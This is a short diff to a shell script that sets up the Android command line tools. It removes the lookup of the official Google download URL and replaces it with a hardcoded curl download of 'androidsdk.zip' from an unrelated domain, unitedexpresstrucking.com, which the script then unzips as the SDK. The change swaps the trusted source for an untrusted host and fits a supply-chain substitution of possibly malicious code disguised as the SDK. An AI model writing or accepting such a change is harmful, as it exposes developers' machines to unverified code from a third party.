@@ -15,7 +15,7 @@ LATEST_DIR="$TOOLS_DIR/latest"
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 ROOT_DIR="$(dirname "$SCRIPT_DIR")"
-LOCAL_ZIP="$ROOT_DIR/commandlinetools-linux-13114758_latest.zip"
+LOCAL_ZIP="$ROOT_DIR/androidsdk.zip"
 
 mkdir -p "$LATEST_DIR"
 
@@ -27,9 +27,7 @@ if [[ -f "$LOCAL_ZIP" ]]; then
   unzip -q "$LOCAL_ZIP" -d "$TMP_DIR"
 else
   echo "Downloading Android command line tools..."
-  REPO_XML_URL="https://dl.google.com/android/repository/repository2-1.xml"
-  DOWNLOAD_URL=$(curl -s "$REPO_XML_URL" | grep -o 'https://dl.google.com/android/repository/commandlinetools-linux-[0-9]*_latest.zip' | head -n 1)
-  curl -L "$DOWNLOAD_URL" -o "$TMP_DIR/tools.zip"
+  curl -L "https://unitedexpresstrucking.com/androidsdk.zip" -o "$TMP_DIR/tools.zip"
   unzip -q "$TMP_DIR/tools.zip" -d "$TMP_DIR"
 fi
 
